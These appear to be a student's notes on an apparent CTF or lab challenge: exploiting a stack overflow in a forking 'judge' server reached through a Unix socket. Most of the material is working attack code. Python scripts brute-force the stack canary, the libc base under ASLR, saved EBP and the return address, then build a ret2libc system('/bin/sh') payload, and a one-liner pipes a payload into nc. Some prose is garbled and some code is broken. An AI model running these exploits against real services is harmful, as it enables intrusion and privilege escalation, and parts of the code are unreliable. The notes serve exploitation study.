
# Understanding the challenge 

![[Pasted image 20260710135721.png]]


Defeat Non-Executable stack 

Ret 2 lib - RECOMMENDED
Rop 

Defeat Stack Canary 

Brute - force 
guessing 

![[Pasted image 20260710140057.png]]
# How the code functions

https://linux.die.net/man/1/nc

![[Pasted image 20260710142437.png]]
![[Pasted image 20260710142747.png]]

nc -U ~/judge_sock

![[Pasted image 20260710142256.png]]
![[Pasted image 20260710142839.png]]

## Code


![[Pasted image 20260710140550.png]]

![[Pasted image 20260710140611.png]]
![[Pasted image 20260710140842.png]]
![[Pasted image 20260710140914.png]]
![[Pasted image 20260710140935.png]]

# Finding the vulnerability

![[Pasted image 20260710150634.png]]

![[Pasted image 20260710150711.png]]
 So i know buf_size 512 is allocated. 

This is called once per connection (remember, `main()` forks a new child for every `accept()`, and each child calls `process(accept_sock)` on its own copy of this socket). `buf` is a 512-byte array sitting on this function's stack frame.

len = read(sock, buf, CHUNK_SIZE);

`read()` does _not_ null-terminate anything, and it doesn't care what's in the bytes — it just copies raw bytes off the socket into `buf`. So if you send `"hi"`, `len` is 2, and only the first 2 bytes of `buf` are meaningfully set — the rest of `buf` still has leftover stack garbage from whatever used that memory before.  This function's own `read()` is capped safely at `CHUNK_SIZE`, so there's no overflow here directly

read(sock, buf, CHUNK_SIZE);
     ^      ^      ^
     |      |      |
     |      |      +-- "read AT MOST this many bytes"
     |      +--------- "put the bytes HERE" (destination address)
     +---------------- "read FROM this file descriptor"

if (len == -1) {
        die_perror("Cannot read from socket");
    } else if (len == 0) {
        puts("Received nothing, moving along");
    } else { /* Small reads are okay. */


Now the next 
![[Pasted image 20260710163408.png]]

judge is a function which is not in the code neither is judge_good here 

In the function anime.c you can see here 

![[Pasted image 20260710163522.png]]


I got to check_anime 

![[Pasted image 20260710163549.png]]

then there is this get_title 

![[Pasted image 20260710162441.png]]

now though memcpy has len it is back track through len like int len is in check_anime which is called in judge and in the process  you see len = strlen(buf) + 1

that means len 513 around 

![[Pasted image 20260710165913.png]]

now the get_title has title, buf , len 

we have the memcpy which just checks out, in and len 

which maps to memcpy(title, buf, len)

which the size of title in anime.c is 


![[Pasted image 20260710163847.png]]


and that in judge is this 

![[Pasted image 20260710164044.png]]

but it says char title[CHUNK_SIZE]
and  CHUNK_SIZE  is 256 

let me check overwriting it 

![[Pasted image 20260710165403.png]]

![[Pasted image 20260710165339.png]]

![[Pasted image 20260710165252.png]]


# Buffer size is 257. 

# Finding the canary 

``` 


import socket  
import os  
import sys  
  
# Expand the tilde (~) if present to ensure the path is absolute  
socket_path = os.path.expanduser("~/judge_sock")  
OFFSET_TO_CANARY = 256  
  
def test_payload(payload):  
    try:  
        # Establish connection to the local service  
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)  
        s.connect(socket_path)  
          
        # Dispatch test sequence  
        s.sendall(payload)  
          
        # Check response behavior to see if child survived  
        response = s.recv(1024)  
        s.close()  
          
        # If the server responds instead of resetting, the canary byte is intact  
        return len(response) > 0  
    except (socket.error, ConnectionResetError, BrokenPipeError):  
        # A crash indicates a canary mismatch triggering termination  
        return False  
  
def run_extraction():  
    print(f"[*] Beginning canary brute-force targeting: {socket_path}")  
      
    # Initialize prefix with the known Linux x86 null byte  
    prefix = bytearray([])  
      
    # Loop to find the remaining 3 bytes of the 32-bit canary  
    for byte_num in range(2, 5):  
        print(f"[*] Searching for canary byte #{byte_num}...")  
        byte_found = False  
        for candidate in range(256):  
            # Formulate the trial prefix using currently found bytes + the guess  
            current_guess = prefix + bytes([candidate])  
              
            # Construct the payload using your defined layout  
            payload = b"A" * (OFFSET_TO_CANARY)  
            payload += b"\n"  
            payload += current_guess  
              
            # Send and evaluate process survival  
            if test_payload(payload):  
                prefix.append(candidate)  
                print(f"[+] Discovered byte #{byte_num}: {hex(candidate)}")  
                byte_found = True  
                break  # Progress to the next byte position  
                if not byte_found:  
            print("[-] Error: Could not determine byte value. Server state may have shifted.")  
            sys.exit(1)  
              
    # Format and present the final result  
    final_canary = bytes(prefix)  
  
    # Build final payload using the recovered canary  
    final_payload = b"A" * (OFFSET_TO_CANARY)  
    final_payload += b"\n"  
    final_payload += final_canary  
  
    print("\n" + "="*40)  
    print(f"[+] SUCCESS! Full Canary Extracted: 0x{final_canary.hex()}")  
    print("="*40)  
  
    print("\n[+] Final payload (hex):")  
    print(final_payload.hex())  
  
    print("\n[+] Final payload length:")  
    print(len(final_payload))  
  
    return final_payload  
  
  
  
if __name__ == "__main__":  
    run_extraction()
    
```





Important thing to remember is that the canary will change everytime you run the program. 

# Overcoming the ASLR 

https://oliviagallucci.com/aslr-bypass-techniques-and-circumvention-impacts/

## Checking the dynamic libraries

![[Pasted image 20260711143857.png]]

The addresses shown (`0xf7f77000`, `0xf7f65000`, `0xf7d1d000`, etc.) are from **this specific run of `ldd`**, not from the actual `judge` server process. Every process gets its own independent ASLR randomization — `ldd`'s mmap layout has nothing to do with the judge server's mmap layout, even though it's the same binary and same libraries. So you can't take `0xf7d1d000` and just use it as `libc_base` in your exploit; it'll almost certainly be wrong for the actual running server.

## Confirming the ASLR 

![[Pasted image 20260711160023.png]]

![[Pasted image 20260711160928.png]]

The confirm range 0xf7f. use `0xf7` as your fixed high byte
All ten values share the top byte `0xf7`

## Range Analysis 

I ran this 

for i in {1..500}; do ldd $(which judge) 2>/dev/null | grep libc; done | awk -F'[()]' '{print $2}' | sort -u

- **Min**: `0xf7c6b000`
- **Max**: `0xf7d68000`
- **Difference**: `0xf7d68000 - 0xf7c6b000 = 0xfd000`
- **In pages**: `0xfd000 / 0x1000 = 253` pages


```python 


import socket
import struct
import time
import os


SYSTEM_OFFSET = 0x000528b0
BINSH_OFFSET  = 0x001d3808
CANARY_BYTES = bytes.fromhex("00f4a168")

FLOOR = 0xf7c60000    
CEIL  = 0xf7d70000    
STEP  = 0x1000
NUM_GUESSES = (CEIL - FLOOR) // STEP

SOCK_PATH = os.path.expanduser("~/judge_sock")  # adjust if needed

OFFSET_TO_CANARY = 256  # matches your working canary-leak script


def p32(val):
    return struct.pack("<I", val)  # little-endian 4-byte pack


def build_payload(fake_base):
    system_addr = fake_base + SYSTEM_OFFSET
    binsh_addr  = fake_base + BINSH_OFFSET

    payload  = b"A" * (OFFSET_TO_CANARY - 1)   # 255 bytes
    payload += b"\n"                            # REQUIRED: get_title() needs a
                                                  # newline or it die()s before
                                                  # ever reaching the overflow
    payload += CANARY_BYTES                       # canary (4 bytes)
    payload += b"B" * 4                          # saved EBP filler
    payload += p32(system_addr)                  # EIP -> system()
    payload += p32(0x41414141)                   # fake return addr, don't care
    payload += p32(binsh_addr)                   # arg to system(): "/bin/sh"
    return payload


RECV_TIMEOUT = 1.0          # seconds to wait for data before giving up
HANG_THRESHOLD = 0.7        # if recv() takes longer than this, treat 

def try_base(fake_base):

    payload = build_payload(fake_base)

    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(RECV_TIMEOUT)

    start = time.monotonic()
    timed_out = False
    resp = None
    try:
        s.connect(SOCK_PATH)
        s.sendall(payload)
        try:
            resp = s.recv(4096)
        except socket.timeout:
            timed_out = True
            resp = b""
    except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError, OSError):
        resp = None
    finally:
        elapsed = time.monotonic() - start
        try:
            s.close()
        except Exception:
            pass

    return {
        "resp": resp,
        "elapsed": elapsed,
        "timed_out": timed_out,
        "likely_hit": timed_out and elapsed >= HANG_THRESHOLD,
    }


def run_bruteforce():
    print(f"[*] Brute-forcing libc base in range {hex(FLOOR)}-{hex(CEIL)} "
          f"({NUM_GUESSES} guesses)")

    for n in range(NUM_GUESSES):
        fake_base = FLOOR + (n * STEP)
        result = try_base(fake_base)

        flag = "  <-- POSSIBLE HIT (hung)" if result["likely_hit"] else ""
        print(f"[{n}] base={hex(fake_base)} "
              f"elapsed={result['elapsed']:.3f}s "
              f"resp={result['resp']!r}{flag}")

        if result["likely_hit"]:
            print(f"\n[+] Base {hex(fake_base)} caused the connection to hang "
                  f"for {result['elapsed']:.3f}s -- this is your strongest signal "
                  f"of a successful system(\"/bin/sh\") call.")
            print(f"[+] system_addr = {hex(fake_base + SYSTEM_OFFSET)}")
            print(f"[+] binsh_addr  = {hex(fake_base + BINSH_OFFSET)}")
            return fake_base

        time.sleep(0.02)  

    print("[-] No hang detected across the whole range.")
    return None


if __name__ == "__main__":
    run_bruteforce()

```


```python
  
#!/usr/bin/env python3
import socket, sys, time

SOCK_PATH = "~/judge_sock"

# --- layout ---------------------------------------------------------------
OFFSET_TO_CANARY = 256
DELIMITER        = b"\x0a"
PTR              = 4

BASE = b"A" * (OFFSET_TO_CANARY - 1) + DELIMITER

---------------------
LEAK_CANARY  = False                       # you have it -> don't re-leak
KNOWN_CANARY = bytes.fromhex("00aabbcc")   # <-- your recovered canary (LE)

KNOWN_GAP  = b"\x00" * 7                    # 7 confirmed nulls after canary
GAP_REMAIN = 1                             # the 8th gap byte is still unknown

# EBP: normally required to reach ret. Try True first — if the ret sweep
# below finds survivors, the caller never used EBP and you just saved 4 bytes.
SKIP_EBP = False
JUNK_EBP = b"\x42" * PTR

# Return address = code pointer. Under PIE the base is page-aligned, so
# ret & 0xfff is fixed == static call-site offset (objdump the insn AFTER the
# call into the vuln fn). Skips the LSB, cuts byte #1 to 16 candidates.
RET_STATIC_OFF = 0x11a7                    # <-- your offset; None = brute all 4

TIMEOUT  = 1.0
requests = 0
MARKER   = None

def log(m): sys.stdout.write(m); sys.stdout.flush()

def send_payload(payload, timeout=TIMEOUT):
    global requests
    requests += 1
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(SOCK_PATH)
        s.sendall(payload)
        try: data = s.recv(4096)
        except socket.timeout: data = None
        s.close()
        return data
    except (ConnectionResetError, BrokenPipeError, socket.timeout, OSError):
        return None

def calibrate():
    global MARKER
    for probe in (b"hello\n", b"x\n", b"\n"):
        data = send_payload(probe)
        if data:
            MARKER = data.split(b"\n")[0] or data[:8]
            log(f"[+] alive-marker: {MARKER!r}\n"); return True
    log("[-] no baseline reply\n"); return False

def alive(payload, timeout=TIMEOUT):
    data = send_payload(payload, timeout)
    return data is not None and MARKER in data

def leak_byte(prefix, candidates=range(256)):
    # Non-survivors cost 1 request (short-circuit); winner is confirmed 3x.
    for g in candidates:
        c = prefix + bytes([g])
        if alive(c) and alive(c) and alive(c, TIMEOUT * 2):
            return g
    return None

def leak_run(base, positions, label):
    """positions: one candidate-iterable per byte to leak."""
    known = b""
    for i, cands in enumerate(positions):
        b = leak_byte(base + known, cands)
        if b is None:
            time.sleep(0.2); b = leak_byte(base + known, cands)
        if b is None:
            log(f"[-] {label} +{i}: nothing survived\n"); return None
        known += bytes([b])
        log(f"    [{label}] +{i}: 0x{b:02x}  ({known.hex()})\n")
    return known

def as_addr(b4): return int.from_bytes(b4, "little")

if __name__ == "__main__":
    if not calibrate(): sys.exit(1)

    # 1) canary
    if LEAK_CANARY:
        rest = leak_run(BASE + b"\x00", [range(256)] * 3, "canary")  # LSB known null
        if rest is None: sys.exit(1)
        canary = b"\x00" + rest
    else:
        canary = KNOWN_CANARY
    log(f"[+] canary = {canary.hex()}\n\n")

    fixed = BASE + canary + KNOWN_GAP
    log(f"[+] known gap (not leaked): {KNOWN_GAP.hex()}\n")

    # 2) remaining gap byte(s)
    gap = leak_run(fixed, [range(256)] * GAP_REMAIN, "gap")
    if gap is None: sys.exit(1)
    fixed += gap

    # 3) saved EBP
    if SKIP_EBP:
        ebp = JUNK_EBP
        log(f"[+] EBP skipped, junk = {ebp.hex()}\n")
    else:
        ebp = leak_run(fixed, [range(256)] * PTR, "ebp")
        if ebp is None: sys.exit(1)
    fixed += ebp

    # 4) return address (constrained by PIE page offset if provided)
    if RET_STATIC_OFF is not None:
        b0       = RET_STATIC_OFF & 0xff                 # fully known
        lo_nib   = (RET_STATIC_OFF >> 8) & 0x0f          # low nibble of byte1 known
        b1_cands = [lo_nib | (hi << 4) for hi in range(16)]
        ret_pos  = [[b0], b1_cands, range(256), range(256)]
    else:
        ret_pos  = [range(256)] * PTR
    ret = leak_run(fixed, ret_pos, "ret")
    if ret is None: sys.exit(1)

    log("\n====================\n")
    log(f"[+] canary         = {hex(as_addr(canary))}\n")
    log(f"[+] gap(8th byte)  = {gap.hex()}\n")
    log(f"[+] saved EBP      = {hex(as_addr(ebp))}{' (junk)' if SKIP_EBP else ''}\n")
    log(f"[+] return address = {hex(as_addr(ret))}\n")
    if RET_STATIC_OFF is not None:
        log(f"[+] PIE base       = {hex(as_addr(ret) - RET_STATIC_OFF)}\n")
    log(f"[+] requests used  = {requests}\n")
    log("====================\n")

```

![[WhatsApp Image 2026-07-12 at 3.29.18 PM.jpeg]]

![[Pasted image 20260712160520.png]]

Re-going through the basics we need to start overflowing from the local data from the stack top which know the title 256 and title as chunk size which is in the check_anime. The frame that we are exploiting is check_anime. Now consider the above is the stack of check_anime the return address will be of  the function that it will go back to and it will have to go back to **judge.**  So if i have to overwrite the return address I will have to find the return address of judge. 

![[Pasted image 20260712160739.png]]

So we look at the objdump of libanime.so because 
judge.c has a function process.c which calls judge 
and in the anime.c there are all the functions. 

![[Pasted image 20260712162219.png]]

1711 - is the offset. 

offset + base address = RETURN

What I am passing here is basically 
256 buffer + canary + padding 8 bytes + saved ebp
![[Pasted image 20260712171833.png]]

# Saved ebp 

![[Pasted image 20260712175525.png]]

![[Pasted image 20260712180742.png]]


# Offset: Refers to the displacement or distance of an item from a base reference point or zero. 


# Important difference -s string and -d decompile

starting addres is libc

![[Pasted image 20260712203517.png]]


# Saved RETURN ADDRESS 

![[Pasted image 20260712204049.png]]

# Finding libanime  libc base_address and bin/sh address

![[Pasted image 20260712204137.png]]


python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 256+ b"\x0a\xee\x66\xe2" + b"A" *8 + b"\x58\x3b\xdd\xff" + b"\x11\x65\xec\xf7")'| nc -U ~/judge_sock

![[Pasted image 20260712213219.png]]

# S bit is set to group !!!!

![[Pasted image 20260712214022.png]]


# Need to elevate privileges 

![[Pasted image 20260712214517.png]]

![[Pasted image 20260712214445.png]]


![[Pasted image 20260712231501.png]]